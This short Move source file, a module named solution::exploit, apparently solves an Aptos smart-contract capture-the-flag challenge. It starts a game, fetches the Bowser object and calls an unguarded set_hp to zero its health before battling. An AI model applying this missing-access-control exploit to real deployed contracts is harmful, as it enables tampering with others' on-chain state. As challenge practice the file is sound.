module solution::exploit {
    use challenge::router::{Self, Mario, Bowser};
    use aptos_framework::object;

    public entry fun solve(account: &signer) {
        let addr = router::start_game(account);
        let mario = object::address_to_object<Mario>(addr);
        router::train_mario(account, mario);
        let addr2 = router::get_wrapper();
        let bowser = object::address_to_object<Bowser>(addr2);
        router::set_hp(account, bowser, 0);
        router::battle(account, mario);
    }
}
